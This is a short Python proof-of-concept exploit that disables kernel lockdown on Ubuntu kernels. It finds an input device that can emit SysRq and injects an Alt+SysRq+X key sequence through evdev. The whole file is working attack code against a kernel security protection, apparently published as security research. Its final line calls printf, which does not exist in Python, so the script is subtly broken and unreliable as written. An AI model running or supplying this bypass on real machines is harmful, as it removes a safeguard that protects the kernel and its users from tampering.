#!/usr/bin/python3

# Disables kernel lockdown on Ubuntu kernels by injecting an Alt+SysRq+X
# key combination through evdev.
# See https://github.com/xairy/unlockdown for details.
#
# Andrey Konovalov <andreyknvl@gmail.com>

import os
import evdev
import evdev.ecodes as e

sysrq_dev = None
for f in os.listdir('/dev/input/'):
	if not(f.startswith('event')):
		continue
	print("checking", f)
	path = os.path.join('/dev/input/', f)
	dev = evdev.InputDevice(path)
	caps = dev.capabilities()
	if e.EV_KEY not in caps:
		continue
	print("EV_KEY supported")
	if e.KEY_SYSRQ not in caps[e.EV_KEY]:
		continue
	print("KEY_SYSRQ supported")
	if e.EV_SYN not in caps:
		continue
	print("EV_SYN supported")
	print('found device', f)
	sysrq_dev = dev
	break

if sysrq_dev == None:
	print('no input devices support sysrq injection')
	exit(-1)

print("sending Alt+SysRq+X sequence")

sysrq_dev.write(e.EV_KEY, e.KEY_LEFTALT, 1)
sysrq_dev.write(e.EV_KEY, e.KEY_SYSRQ, 1)
sysrq_dev.write(e.EV_KEY, e.KEY_X, 1)

sysrq_dev.write(e.EV_KEY, e.KEY_X, 0)
sysrq_dev.write(e.EV_KEY, e.KEY_SYSRQ, 0)
sysrq_dev.write(e.EV_KEY, e.KEY_LEFTALT, 0)

sysrq_dev.write(e.EV_SYN, 0, 0)

printf("done")
